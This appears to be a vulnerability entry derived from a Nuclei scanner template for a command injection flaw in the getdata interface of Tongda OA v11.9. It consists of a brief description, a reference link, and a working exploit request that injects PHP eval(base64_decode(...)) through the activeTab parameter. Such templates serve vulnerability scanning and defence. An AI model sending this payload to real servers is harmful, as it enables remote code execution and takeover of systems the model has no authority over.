# Nuclei Template: Tongda OA v11.9 getadata - Remote Code Execution
**Template ID:** tongda-getdata-rce
**Vulnerability Class:** OS Command Injection
**Severity:** Critical
**CWE:** CWE-78
**Source:** Nuclei Template (`tongda-getdata-rce.yaml`)

## Vulnerability Information & PoC

## Description
There is an arbitrary command execution vulnerability in the getdata interface of Tongda OA v11.9. An attacker can execute arbitrary commands on the server to control server permissions through the vulnerability.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval(base64_decode(%22{{base64(payload)}}%22)))%3B/*&id=19&module=Carouselimage
```

## References
- https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.9%20getdata%20%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
